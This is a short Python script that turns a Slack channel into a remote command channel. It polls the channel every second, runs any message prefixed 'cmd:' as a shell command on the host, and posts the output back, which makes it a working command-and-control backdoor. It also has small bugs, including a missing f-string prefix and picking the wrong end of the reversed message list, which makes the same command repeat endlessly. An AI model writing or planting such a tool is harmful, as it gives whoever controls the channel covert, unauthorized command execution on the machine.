
import subprocess
import time
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError


#write in group
def send_slack_message(channel_id, message_text):
    """Sends a message to the specified Slack channel."""

    client = WebClient(token='paste the token here')
    try:
        response = client.chat_postMessage(
            channel=channel_id,
            text=message_text
        )
        return response
    except SlackApiError as e:
        print(f"Error sending message: {e}")




# Create a Slack client using an environment variable for the token
client = WebClient(token='paste the token here')

def read_slack(channel_id):
    """Reads recent messages from a specified Slack channel and returns them as an array.

    Args:
        channel_id (str): The ID of the channel to read messages from.

    Returns:
        list: An array of message dictionaries, with the latest message at index 1,
            or an empty list if an error occurs.
    """

    try:
        response = client.conversations_history(channel=channel_id)
        messages = response["messages"]

        # Reverse the messages to have the latest first
        messages.reverse()

        # Create an array with the latest message at index 1
        messages_array = [None] + messages  # Pad with None at index 0

        return messages_array

    except SlackApiError as e:
        command_output = "Error reading messages from Slack: {e}"
        send_slack_message(channel_id, command_output)
        return []  # Return an empty list on error


def worker(messages):
    """Processes the latest message from the Slack channel."""

    if messages:
        latest_message = messages[-1]
        command_text = latest_message["text"][4:]

        if latest_message and latest_message["text"].startswith("cmd:"):
            #print("Command: " + command_text)
            try:
                command_args = command_text.split()
                result = subprocess.run(command_args, capture_output=True, text=True)
                command_output = result.stdout
            except subprocess.CalledProcessError as e:
                #print(f"Error executing command: {e}")
                command_output = f"Error executing command: {e}"
                send_slack_message(channel_id, command_output)
            except FileNotFoundError as e:
                #print(f"FileNotFoundError: {e}")
                command_output = f"FileNotFoundError: {e}"
                send_slack_message(channel_id, command_output)
                #except missing_text_message
            if not command_output:  # Check if command_output is empty
                 error_message = "Command Executed, But no output"
                 command_output = error_message               
                #print(command_output)
            send_slack_message(channel_id, command_output)
        elif latest_message and latest_message["text"].startswith("msg:"):
            print("Message: " + command_text)
            command_output = "message " + command_text + " successfully shared"
            send_slack_message(channel_id, command_output)




# Example usage:
channel_id = "channel id"  # Replace with the actual channel ID
while True:
    messages = read_slack(channel_id)
    worker(messages)
    time.sleep(1)

